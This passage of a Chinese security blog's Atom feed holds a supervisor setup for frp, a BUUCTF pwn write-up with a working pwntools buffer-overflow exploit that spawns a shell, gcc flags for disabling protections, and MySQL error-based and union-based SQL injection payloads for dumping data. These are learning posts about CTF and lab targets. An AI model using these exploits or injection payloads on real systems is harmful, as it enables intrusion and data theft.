class="line">1</span></pre></td><td class="code"><pre><span class="line">[program:frp]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">directory&#x3D;&#x2F;root&#x2F;software&#x2F;frp&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">command&#x3D;&#x2F;root&#x2F;software&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;software&#x2F;frp&#x2F;frps.ini</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">autostart&#x3D;true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">autorestart&#x3D;true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">startretries&#x3D;10</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">redirect_stderr&#x3D;true</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">stdout_logfile&#x3D;&#x2F;tmp&#x2F;rdp.log</span></pre></td></tr></table></figure><p>program参数为待会启动的时候的项目名</p><p>directory参数为要运行的脚本或程序所在的项目</p><p>command参数为要运行该脚本或程序时执行的命令</p><p>其他参数顾名思义就好了，具体意义网上也能找到更详细的解答</p><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><p>使用<code>supervisorctl start frp</code>命令（根据program名字）即可用supervisor启动frp进程</p><p>在启动的时候遇到了一个坑，在保存了配置文件后，输入上述命令显示</p><p><code>frp: ERROR (no such process)</code></p><p>然后查看status，重启supervisor服务之后都不行，一度怀疑人生，最后在大佬的帮助下才知道还要执行<code>supervisorctl reload</code>才会载入上述所写的配置文件，淦。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;渗透的时候或者平常需要用到内网映射的时候常常会用到frp，但是frp有时会断。以前为了解决这个问题还特意写了个脚本来检查frp进程，现在想起来实在是too young。最近刚好接触到守护进程，就拿frp来试试水，然后supervisor是一款常用的守护进程工具，就决定是你了。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="misc" scheme="http://leemeanvvi.github.io/categories/misc/"/>
+    
+    
+      <category term="linux" scheme="http://leemeanvvi.github.io/tags/linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>rip_wp</title>
+    <link href="http://leemeanvvi.github.io/2019/12/12/rip-wp/"/>
+    <id>http://leemeanvvi.github.io/2019/12/12/rip-wp/</id>
+    <published>2019-12-12T15:37:40.000Z</published>
+    <updated>2020-01-05T07:42:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>从buuctf中简单的题目开始学习pwn吧</p><a id="more"></a><h4 id="查看文件信息"><a href="#查看文件信息" class="headerlink" title="查看文件信息"></a>查看文件信息</h4><p>使用checksec查看题目中的pwn1文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">RELRO:    Partial RELRO</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Stack:    No canary found</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">NX:       NX disabled</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">PIE:      No PIE (0x400000)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">RWX:      Has RWX segments</span></pre></td></tr></table></figure><p>64位文件，没有开启栈保护，栈上数据可执行，没有开启ASLR</p><h4 id="ida查看文件代码"><a href="#ida查看文件代码" class="headerlink" title="ida查看文件代码"></a>ida查看文件代码</h4><p>发现程序中内置了后门函数fun()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">int fun()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  return system(&quot;&#x2F;bin&#x2F;sh&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>并且看到main函数中使用gets函数直接读取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  char s; &#x2F;&#x2F; [rsp+1h] [rbp-Fh]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  puts(&quot;please input&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  gets(&amp;s, argv);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  puts(&amp;s);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  puts(&quot;ok,bye!!!&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  return 0;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>那么思路就是在gets读取数据时，覆盖掉栈帧中的返回地址，控制程序ret到fun函数中执行system(“/bin/sh”)的地方，就可以getshell了</p><h4 id="栈帧分析"><a href="#栈帧分析" class="headerlink" title="栈帧分析"></a>栈帧分析</h4><p>当gets读取数据时，将从栈中rbp-fh的地方也就是下表的buf_address开始写，我们的目标是要将返回地址ret_address覆盖成我们想要的地址，从buf_address到rbp的大小为0xf，rbp到ret_address的大小为0x8，所以从buf_address到ret_address的大小为0xf+0x8=0x17，也就是说要在栈中先写入0x17的字符，接着写入我们想控制程序返回的地址了  </p><blockquote><pre><code>+-------------------------+  |buf_address |   rbp-fh   |  |------------|------------|  |   ...      |    ...     |  |   ...      |    ...     |  |------------|------------|  |   rbp      |    rbp     |  |------------|------------|  |ret_address |   rbp+8h   |  +-------------------------+  </code></pre></blockquote><p><img src="https://s2.ax1x.com/2019/12/13/Qc8HzD.png" alt="pwn1"></p><h4 id="编写exp"><a href="#编写exp" class="headerlink" title="编写exp"></a>编写exp</h4><p>在gdb中看到fun函数的地址0x401186</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gdb-peda$ p fun</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x401186 &lt;fun&gt;</span></pre></td></tr></table></figure><p>fun函数的汇编如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble fun</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function fun:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">   0x0000000000401186 &lt;+0&gt;:push   rbp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">   0x0000000000401187 &lt;+1&gt;:mov    rbp,rsp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">   0x000000000040118a &lt;+4&gt;:lea    rdi,[rip+0xe8a]        # 0x40201b</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">   0x0000000000401191 &lt;+11&gt;:call   0x401040 &lt;system@plt&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">   0x0000000000401196 &lt;+16&gt;:nop</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">   0x0000000000401197 &lt;+17&gt;:pop    rbp</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">   0x0000000000401198 &lt;+18&gt;:ret    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">End of assembler dump.</span></pre></td></tr></table></figure><p>关键代码为0x40118a处，将”/bin/sh”字符串传给rdi，然后在0x401191中调用system函数执行，所以我们ret到0x40118a即可，最后exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">from pwn import *</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">context.log_level&#x3D;&#39;debug&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">conn &#x3D; remote(&quot;node3.buuoj.cn&quot;,27674)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">shell &#x3D; 0x40118a</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;A&quot;*0x17 + p64(shell)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">conn.sendline(payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">#conn.recvall()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">conn.interactive()</span></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;从buuctf中简单的题目开始学习pwn吧&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="binary security" scheme="http://leemeanvvi.github.io/categories/binary-security/"/>
+    
+    
+      <category term="pwn" scheme="http://leemeanvvi.github.io/tags/pwn/"/>
+    
+      <category term="buuctf" scheme="http://leemeanvvi.github.io/tags/buuctf/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>gcc与pwn练习</title>
+    <link href="http://leemeanvvi.github.io/2019/12/12/gcc%E4%B8%8Epwn%E7%BB%83%E4%B9%A0/"/>
+    <id>http://leemeanvvi.github.io/2019/12/12/gcc%E4%B8%8Epwn%E7%BB%83%E4%B9%A0/</id>
+    <published>2019-12-11T16:41:22.000Z</published>
+    <updated>2019-12-12T13:48:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<h6 id="普通用法"><a href="#普通用法" class="headerlink" title="普通用法"></a>普通用法</h6><p><code>gcc test.c -o test.o</code></p><h6 id="开启-关闭栈可执行NX"><a href="#开启-关闭栈可执行NX" class="headerlink" title="开启/关闭栈可执行NX"></a>开启/关闭栈可执行NX</h6><p><code>-z execstack / -z noexecstack</code></p><h6 id="关闭-开启-全开启栈保护Canary"><a href="#关闭-开启-全开启栈保护Canary" class="headerlink" title="关闭/开启/全开启栈保护Canary"></a>关闭/开启/全开启栈保护Canary</h6><p><code>-fno-stack-protector / -fstack-protector / -fstack-protector-all</code></p><h6 id="关闭-开启地址随机化PIE"><a href="#关闭-开启地址随机化PIE" class="headerlink" title="关闭/开启地址随机化PIE"></a>关闭/开启地址随机化PIE</h6><p><code>-no-pie / -pie</code></p><h6 id="关闭-部分开启-完全开启对GOT表写权限"><a href="#关闭-部分开启-完全开启对GOT表写权限" class="headerlink" title="关闭/部分开启/完全开启对GOT表写权限"></a>关闭/部分开启/完全开启对GOT表写权限</h6><p><code>-z norelro / -z lazy / -z now</code></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h6 id=&quot;普通用法&quot;&gt;&lt;a href=&quot;#普通用法&quot; class=&quot;headerlink&quot; title=&quot;普通用法&quot;&gt;&lt;/a&gt;普通用法&lt;/h6&gt;&lt;p&gt;&lt;code&gt;gcc test.c -o test.o&lt;/code&gt;&lt;/p&gt;
+&lt;h6 id=&quot;开启-关闭栈可执行NX&quot;&gt;&lt;a 
+      
+    
+    </summary>
+    
+    
+      <category term="binary security" scheme="http://leemeanvvi.github.io/categories/binary-security/"/>
+    
+    
+      <category term="pwn" scheme="http://leemeanvvi.github.io/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sql注入-报错注入</title>
+    <link href="http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
+    <id>http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
+    <published>2019-12-10T09:07:03.000Z</published>
+    <updated>2020-01-05T07:43:12.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦</p><a id="more"></a><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>网上常见有十二种报错方法，然而实战中我最常用的只有updatexml()，函数名好记并且构造比较简单，对于其他报错函数非常陌生，遂逐一测试，以下为常见的报错方法在mysql 5.7.28版本下的测试结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/12/12/QcP4UI.png" alt="version" title="">                </div>                <div class="image-caption">version</div>            </figure><p>upadtexml()</p><p><code>select updatexml(1,concat(0x7e,user()),1);</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/12/12/QcEakj.png" alt="updatexml()" title="">                </div>                <div class="image-caption">updatexml()</div>            </figure><p>extractvalue()</p><p><code>select extractvalue(1,concat(0x7e,user()));</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/12/12/QcEN7Q.png" alt="extractvalue()" title="">                </div>                <div class="image-caption">extractvalue()</div>            </figure><p>floor()</p><p><code>select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://s2.ax1x.com/2019/12/12/QcEdts.png" alt="floor()" title="">                </div>                <div class="image-caption">floor()</div>            </figure><p>name_const()</p><p><code>select name_const(user(),0);</code></p><p>高版本不可用</p><p>join</p><p><code>select * from(select * from mysql.user a join mysql.user b)c;</code></p><p>能用但貌似只能爆列名，用处不大</p><p>exp()</p><p><code>select exp(~(select * from(select user())a));</code></p><p>高版本不可用</p><p>GeometryCollection()</p><p><code>geometrycollection((select * from(select * from(select user())a)b));</code></p><p>高版本不可用</p><p>polygon()</p><p><code>select polygon((select * from(select * from(select user())a)b));</code></p><p>高版本不可用</p><p>multipoint()</p><p><code>select multipoint((select * from(select * from(select user())a)b));</code></p><p>高版本不可用</p><p>multlinestring()</p><p><code>select multilinestring((select * from(select * from(select user())a)b));</code></p><p>高版本不可用</p><p>multipolygon()</p><p><code>select multipolygon((select * from(select * from(select user())a)b));</code></p><p>高版本不可用</p><p>linestring()</p><p><code>select linestring((select * from(select * from(select user())a)b));</code></p><p>高版本不可用</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>updatexml()和extractvalue()函数是比较实用的，floor()函数的构造实在太难记了，后面几种报错方法看payload应该原理差不多，只是用不同函数来触发而已，而且高版本的mysql都用不了。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="sql注入" scheme="http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>sql注入base</title>
+    <link href="http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5base/"/>
+    <id>http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5base/</id>
+    <published>2019-12-10T08:39:21.000Z</published>
+    <updated>2020-01-05T07:43:04.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>第一篇正式的博客就从我入门安全的sql注入开始吧</p><a id="more"></a><h4 id="平平无奇的注入（mysql）"><a href="#平平无奇的注入（mysql）" class="headerlink" title="平平无奇的注入（mysql）"></a>平平无奇的注入（mysql）</h4><p>sql注入也是老生常谈了，就从最基础的开始吧</p><ul><li>判断是否存在注入以及确认是字符型还是数字型<blockquote><p>加单引号，加减法，and 1=1，and 1=2</p></blockquote></li><li>判断字段数量</li></ul><ol><li><code>order by n</code></li><li><code>union select 1,2,3...n</code></li></ol><p>(n为字段数量，若与原查询语句不匹配，则sql语句将会报错)</p><ul><li>爆当前数据库名（查询字段数量要与原查询语句匹配）</li></ul><p><code>union select database()</code></p><ul><li>爆当前用户名</li></ul><p><code>union select user()</code></p><ul><li>爆当前数据库版本</li></ul><p><code>union select version()</code></p><ul><li>爆当前数据库表名</li></ul><p><code>union select table_name from information_schema.tables where table_schema=database()</code></p><ul><li>爆当前数据库的列名</li></ul><p><code>union select column_name from information_schema.columns where table_schema=database() and tables_name=&#39;xxx&#39;</code></p><ul><li>dump数据</li></ul><p><code>union select xxx from yyy</code></p><h4 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h4><p><a href="https://github.com/Audi-1/sqli-labs">sqli-libs</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;第一篇正式的博客就从我入门安全的sql注入开始吧&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://leemeanvvi.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="sql注入" scheme="http://leemeanvvi.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>beginning</title>
+    <link href="http://leemeanvvi.github.io/2019/12/09/beginning/"/>
+    <id>http://leemeanvvi.github.io/2019/12/09/beginning/</id>
+    <published>2019-12-09T15:46:01.000Z</published>
+    <updated>2019-12-14T15:52:04.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>其实想写博客很久了，在DO的vps上搭过wordpress，写了几篇没人看的文章之后不了了之。<br>2019年12月10日00:09，毕业已经半年了，开始感受到现实带来的压力。<br>生起了写博客的欲望，想要对自己的一些琐事做下记录。<br>终于配置好hexo了，怀揣着些许忐忑和对未来的希冀，明天开始，好好努力吧！</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;其实想写博客很久了，在DO的vps上搭过wordpress，写了几篇没人看的文章之后不了了之。&lt;br&gt;2019年12月10日00:09，毕业已经半年了，开始感受到现实带来的压力。&lt;br&gt;生起了写博客的欲望，想要对自己的一些琐事做下记录。&lt;br&gt;终于配置好hexo了，怀揣着些
+      
+    
+    </summary>
+    
+    
+      <category term="whispers" scheme="http://leemeanvvi.github.io/categories/whispers/"/>
+    
+    
+  </entry>
+  
+</feed>
